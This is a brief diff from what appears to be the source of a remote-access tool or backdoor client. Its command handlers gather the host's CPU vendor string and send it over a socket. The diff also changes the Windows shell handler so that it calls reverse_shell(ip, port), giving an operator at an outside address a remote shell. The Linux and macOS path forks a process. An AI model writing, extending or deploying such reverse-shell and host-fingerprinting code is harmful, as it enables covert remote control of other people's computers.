@@ -98,10 +98,7 @@ void handle_cpu(int fd, CHAR *target) {
     *reinterpret_cast<int*>(vendor + 8) = regs[2];
     *reinterpret_cast<int*>(vendor + 12) = '\0';
 
-    printf("%s", cpu_content);
-
     strncpy_s(cpu_content, vendor, 0x20);
-
     set_message(fd, cpu_content, target);
 
 #elif defined(__linux__) || defined(__APPLE__)
@@ -123,9 +120,10 @@ void handle_cpu(int fd, char *target) {
 }
 
 #ifdef _WIN32
-void handle_shell(int fd, CHAR *target) {
+void handle_shell(int fd, CHAR *target, CHAR *ip, int port) {
+    reverse_shell(ip, port);
 #elif defined(__linux__) || defined(__APPLE__)
-void handle_shell(int fd, char *target) {
+void handle_shell(int fd, char *target, char *ip, int port) {
     // Start new process
     pid_t pid = fork();
     // Children
